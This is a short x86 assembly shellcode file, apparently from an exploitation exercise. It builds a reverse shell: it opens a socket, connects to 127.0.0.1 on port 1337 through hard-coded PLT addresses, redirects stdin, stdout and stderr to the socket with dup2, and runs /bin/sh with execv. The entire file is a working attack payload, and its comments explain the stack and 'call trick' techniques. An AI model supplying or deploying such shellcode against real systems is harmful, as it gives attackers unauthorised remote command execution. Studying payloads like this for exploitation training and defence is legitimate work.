#Steps: 1. change stack pointer as to not interfere with our code. 2.open socket and keep socket number. 3. connect (using call trick to get paramaters)
#4. redirect all streams (in, out, err) to our socket 5. call execv to open remote terminal
#All addresses arrived from PLT table in objdump

	call _start
_start:
	pop esp #trick to offset the stack so all stack operations will erase nop's and not our code.
	sub esp , 20

#create socket
	push 0
	push 1
	push 2 
	mov eax, 0x08048730 #_socket 
	call eax #_socket, eax is now port number

#connect
	mov esi , eax #save pid for after connect call
	push 16 #struct size for connect

	jmp _want_struct #get pointer on stack for struct, this loads the stack for a call to connect
_got_struct:
	push esi #socket number
	mov eax, 0x08048750 #_connect 
	call eax #_connect

#redirect streams
	
	push 0	
	push esi # the socket
	mov ebx , 0x08048600 #address for dup2
	call ebx #_dup2

	push 1
	push ESI
	mov ebx , 0x08048600 #address for dup2, moved again as ebx is not saved
	call ebx #_dup2

	push 2
	push ESI
	mov ebx , 0x08048600 #address for dup2
	call ebx #_dup2
	
#preparing call to execv
	jmp _want_bin_bash
_got_bin_bash:
	pop ebx #from the call trick bellow, load pointer to "/bin/sh\0"
	lea ecx, [ebx-9]
	push ecx
	push ebx
	mov ebx, 0x080486d0 #_execv 
	call ebx #_execv

_want_struct:
	call _got_struct #call trick to load struct into memory.
	.int 0x39050002 #IP protocol and socket num in reverse order
	.int 0x0100007F #127.0.0.1 in reverse order
	.int 0x00000000
	.int 0x00000000

_want_bin_bash:
	call _got_bin_bash #"call trick" to get a pointer to the "/bin/sh@" string
	.ASCII "/bin/sh\0" # the "/bin/sh\0" string
	.int 0x00000000
	.int 0x00000000
